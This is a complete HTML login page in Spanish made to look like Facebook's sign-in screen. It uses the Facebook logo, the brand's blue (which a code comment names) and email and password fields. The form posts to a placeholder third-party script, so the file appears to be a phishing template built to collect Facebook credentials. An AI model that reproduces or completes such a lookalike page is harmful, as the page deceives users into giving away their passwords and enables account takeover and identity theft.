<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 320px;
            text-align: center;
        }
        .login-logo {
            width: 180px; /* Ajusta el tamaño del logo según tus necesidades */
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .btn-login {
            width: 100%;
            padding: 12px;
            background-color: #1877f2; /* Color azul de Facebook */
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .btn-login:hover {
            background-color: #166fe5; /* Cambia el tono al pasar el mouse */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img class="login-logo" src="facebook_logo.png" alt="Facebook">
        <form action="tu_script_de_autenticacion.php" method="post">
            <input class="input-field" type="email" name="email" placeholder="Correo electrónico" required>
            <input class="input-field" type="password" name="password" placeholder="Contraseña" required>
            <button class="btn-login" type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>
